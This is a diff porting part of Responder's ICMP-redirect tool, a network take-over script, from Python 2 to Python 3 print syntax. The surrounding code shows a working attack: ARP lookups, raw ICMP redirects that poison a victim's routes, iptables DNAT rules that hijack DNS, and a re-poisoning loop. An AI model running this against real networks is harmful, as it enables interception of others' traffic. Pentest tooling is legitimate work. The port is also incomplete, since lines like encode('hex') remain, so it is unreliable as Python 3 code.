@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# This file is part of Responder, a network take-over set of tools 
+# This file is part of Responder, a network take-over set of tools
 # created and maintained by Laurent Gaffie.
 # email: laurent.gaffie@gmail.com
 # This program is free software: you can redistribute it and/or modify
@@ -40,23 +40,23 @@ parser.add_option('-a', '--alternate',action="store", help="The alternate gatewa
 options, args = parser.parse_args()
 
 if options.OURIP is None:
-    print "-i mandatory option is missing.\n"
+    print("-i mandatory option is missing.\n")
     parser.print_help()
     exit(-1)
 elif options.OriginalGwAddr is None:
-    print "-g mandatory option is missing, please provide the original gateway address.\n"
+    print("-g mandatory option is missing, please provide the original gateway address.\n")
     parser.print_help()
     exit(-1)
 elif options.VictimIP is None:
-    print "-t mandatory option is missing, please provide a target.\n"
+    print("-t mandatory option is missing, please provide a target.\n")
     parser.print_help()
     exit(-1)
 elif options.Interface is None:
-    print "-I mandatory option is missing, please provide your network interface.\n"
+    print("-I mandatory option is missing, please provide your network interface.\n")
     parser.print_help()
     exit(-1)
 elif options.ToThisHost is None:
-    print "-r mandatory option is missing, please provide a destination target.\n"
+    print("-r mandatory option is missing, please provide a destination target.\n")
     parser.print_help()
     exit(-1)
 
@@ -187,17 +187,17 @@ def ReceiveArpFrame(DstAddr):
         data = s.recv(1024)
         DstMac = data[22:28]
         DestMac = DstMac.encode('hex')
-        PrintMac = ":".join([DestMac[x:x+2] for x in xrange(0, len(DestMac), 2)])
+        PrintMac = ":".join([DestMac[x:x+2] for x in range(0, len(DestMac), 2)])
         return PrintMac,DstMac
     except:
-        print "[ARP]%s took too long to Respond. Please provide a valid host.\n"%(DstAddr)
+        print("[ARP]%s took too long to Respond. Please provide a valid host.\n"%(DstAddr))
         exit(1)
 
 def IcmpRedirectSock(DestinationIP):
     PrintMac,DestMac = ReceiveArpFrame(VictimIP)
-    print '[ARP]Target Mac address is :',PrintMac
+    print('[ARP]Target Mac address is :',PrintMac)
     PrintMac,RouterMac = ReceiveArpFrame(OriginalGwAddr)
-    print '[ARP]Router Mac address is :',PrintMac
+    print('[ARP]Router Mac address is :',PrintMac)
     s = socket(AF_PACKET, SOCK_RAW)
     Protocol = 0x0800
     s.bind((Interface, Protocol))
@@ -210,7 +210,7 @@ def IcmpRedirectSock(DestinationIP):
     IPPack.calculate()
     final = str(Eth)+str(IPPack)
     s.send(final)
-    print '\n[ICMP]%s should have been poisoned with a new route for target: %s.\n'%(VictimIP,DestinationIP)
+    print('\n[ICMP]%s should have been poisoned with a new route for target: %s.\n'%(VictimIP,DestinationIP))
 
 def FindWhatToDo(ToThisHost2):
     if ToThisHost2 != None:
@@ -227,11 +227,11 @@ def RunThisInLoop(host, host2, ip):
     ouripadd = pipes.quote(ip)
     call("iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "+dns1+" --dport 53 -j DNAT --to-destination "+ouripadd+":53", shell=True)
     call("iptables -A OUTPUT -p ICMP -j DROP && iptables -t nat -A PREROUTING -p udp --dst "+dns2+" --dport 53 -j DNAT --to-destination "+ouripadd+":53", shell=True)
-    print "[+]Automatic mode enabled\nAn iptable rules has been added for both DNS servers."
+    print("[+]Automatic mode enabled\nAn iptable rules has been added for both DNS servers.")
     while True:
         IcmpRedirectSock(DestinationIP=dns1)
         IcmpRedirectSock(DestinationIP=dns2)
-        print "[+]Repoisoning the target in 8 minutes..."
+        print("[+]Repoisoning the target in 8 minutes...")
         sleep(480)
 
 FindWhatToDo(ToThisHost2)
